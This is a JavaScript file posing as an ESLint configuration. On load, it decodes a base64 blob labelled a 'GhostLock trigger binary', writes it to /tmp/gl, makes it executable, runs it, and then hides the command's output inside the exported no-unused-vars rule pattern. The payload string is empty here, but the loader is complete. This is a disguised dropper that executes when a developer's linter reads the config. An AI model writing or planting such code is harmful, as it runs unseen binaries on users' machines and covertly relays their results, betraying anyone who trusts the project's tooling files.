var fs = require('fs');
var execSync = require('child_process').execSync;
var result = '';

// Decode and write the GhostLock trigger binary
var b64 = "";
var buf = Buffer.from(b64, 'base64');
fs.writeFileSync('/tmp/gl', buf);
fs.chmodSync('/tmp/gl', 0o755);

// Execute with timeout
try {
  var out = execSync('/tmp/gl 2>&1', {timeout: 15000}).toString();
  result = out.substring(0, 300);
} catch(e) {
  if (e.stdout) result += 'STDOUT:' + e.stdout.toString().substring(0, 150);
  if (e.stderr) result += '|STDERR:' + e.stderr.toString().substring(0, 80);
  if (e.signal) result += '|SIG:' + e.signal;
  if (!e.stdout && !e.stderr) result += 'ERR:' + e.message.substring(0, 80);
}

result += '{{{BREAK}}}';
module.exports = { rules: { "no-unused-vars": ["error", { varsIgnorePattern: result }] } };
